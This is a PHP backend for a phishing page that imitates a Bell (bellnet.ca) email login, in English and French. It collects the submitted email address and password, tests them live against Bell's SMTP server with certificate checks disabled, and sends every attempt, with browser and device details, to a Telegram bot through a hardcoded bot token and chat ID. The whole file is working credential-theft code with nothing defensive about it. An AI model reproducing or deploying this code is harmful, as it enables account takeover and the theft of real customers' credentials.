<?php
ob_start(); // start buffer
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type");

error_reporting(E_ALL);
ini_set('display_errors', 1);
ob_clean();
header('Content-Type: application/json; charset=utf-8');

function sendToTelegram($message) {
    $botToken = '7649612009:AAGz7-YLIvEEQhWBGyHmG6uhu2vPY6U-e2Q';
    $chatId   = '7394958970';
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $params = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    @file_get_contents($url . '?' . http_build_query($params));
}

function safe($str) {
    return htmlspecialchars($str ?? '', ENT_QUOTES, 'UTF-8');
}

// -------------------- Multilingual messages --------------------
$messages = [
    'en' => [
        'unknown_error'       => 'Unknown error',
        'invalid_method'      => 'Invalid request method.',
        'email_required'      => 'Email is required.',
        'password_required'   => 'Password is required.',
        'invalid_email'       => 'email must end with @bellnet.ca.',
        'login_success'       => 'Login Successful',
        'invalid_credentials' => 'You have entered invalid credentials. Please try again.',
        'connection_failed'   => 'Connection failed:'
    ],
    'fr' => [
        'unknown_error'       => 'Erreur inconnue',
        'invalid_method'      => 'Méthode de requête invalide.',
        'email_required'      => "L'adresse e-mail est requise.",
        'password_required'   => 'Le mot de passe est requis.',
        'invalid_email'       => "L'e-mail doit se terminer par @bellnet.ca.",
        'login_success'       => 'Connexion réussie',
        'invalid_credentials' => "Identification invalide. Essayez de nouveau.",
        'connection_failed'   => 'Échec de la connexion :'
    ]
];

function msg($key, $lang, $messages) {
    return $messages[$lang][$key] ?? $messages['en'][$key];
}

$response = ["status" => "error", "message" => msg('unknown_error', 'en', $messages)]; 

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $lang         = $_POST['lang'] ?? 'en';
    $lang         = in_array($lang, ['en','fr']) ? $lang : 'en';

    $email        = trim($_POST['email'] ?? '');
    $password     = $_POST['input_text'] ?? '';
    $browser_info = safe($_POST['browser_info'] ?? '');
    $device_info  = safe($_POST['device_info'] ?? '');

    // Extra Info
    $userAgent = safe($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown');
    $referer   = safe($_SERVER['HTTP_REFERER'] ?? 'Direct');
    $language  = safe($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown');

    // Email validation
    if (!$email) {
        echo json_encode(['status'=>'error','message'=>msg('email_required',$lang,$messages)]); exit;
    }

    if (!preg_match('/^[^@\s]+@bellnet\.ca$/', $email)) {
        echo json_encode(['status'=>'error','message'=>msg('invalid_email',$lang,$messages)]); exit;
    }

    if (!$password) {
        echo json_encode(['status'=>'error','message'=>msg('password_required',$lang,$messages)]); exit;
    }

    // SMTP check
    $server = 'ssl://smtpa.bellnet.ca';
    $port   = 465;
    $contextOptions = ['ssl' => ['verify_peer'=>false,'verify_peer_name'=>false,'allow_self_signed'=>true]];
    $context = stream_context_create($contextOptions);
    $fp = @stream_socket_client("$server:$port", $errno, $errstr, 10, STREAM_CLIENT_CONNECT, $context);

    if (!$fp) {
        $response = [
            'status' => 'error',
            'message' => msg('connection_failed', $lang, $messages) . " $errstr ($errno)"
        ];
        sendToTelegram("❌ Connection Failed
📧 Email: $email
🔑 Password: $password
🖥️ Browser: $browser_info
📱 Device: $device_info
↪️ Referer: $referer
🌐 Language: $language
Error: $errstr ($errno)");
    } else {
        fgets($fp);
        fputs($fp, "EHLO localhost\r\n");
        while ($line = fgets($fp)) {
            if (strpos($line, '250 ') === 0) break;
        }
        fputs($fp, "AUTH LOGIN\r\n");
        fgets($fp);
        fputs($fp, base64_encode($email) . "\r\n");
        fgets($fp);
        fputs($fp, base64_encode($password) . "\r\n");
        $smtpResponse = fgets($fp);

        if (strpos($smtpResponse, '235') === 0) {
            $response = [
                'status' => 'success',
                'message' => msg('login_success', $lang, $messages)
            ];
            sendToTelegram("✅ Login Successful
📧 Email: $email
🔑 Password: $password
🖥️ Browser: $browser_info
📱 Device: $device_info
↪️ Referer: $referer
🌐 Language: $language");
        } else {
            $response = [
                'status' => 'error',
                'message' => msg('invalid_credentials', $lang, $messages)
            ];
            sendToTelegram("❌ Login Failed
📧 Email: $email
🔑 Password: $password
🖥️ Browser: $browser_info
📱 Device: $device_info
↪️ Referer: $referer
🌐 Language: $language
Response: " . safe($smtpResponse));
        }

        fputs($fp, "QUIT\r\n");
        fclose($fp);
    }

} else {
    $response = ['status' => 'error', 'message' => msg('invalid_method', 'en', $messages)];
}

echo json_encode($response);
?>

